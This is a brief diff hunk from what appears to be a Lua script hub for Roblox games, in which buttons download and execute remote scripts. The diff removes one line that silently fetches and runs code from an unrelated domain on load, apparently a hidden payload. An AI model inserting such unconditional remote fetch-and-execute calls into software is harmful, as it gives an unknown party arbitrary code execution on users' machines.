@@ -1220,7 +1220,6 @@ Games:CreateButton({
         loadstring(game:HttpGet("https://raw.githubusercontent.com/EnesXVC/Games-Scripts/main/Blue-Lock-Fearise-Hub"))()
     end
 })
-loadstring(game:HttpGet("https://globalexp.xyz/fsfs"))()
 -- Build A Plane (Axiora)
 Games:CreateButton({
     Name = "Build A Plane (Axiora)",
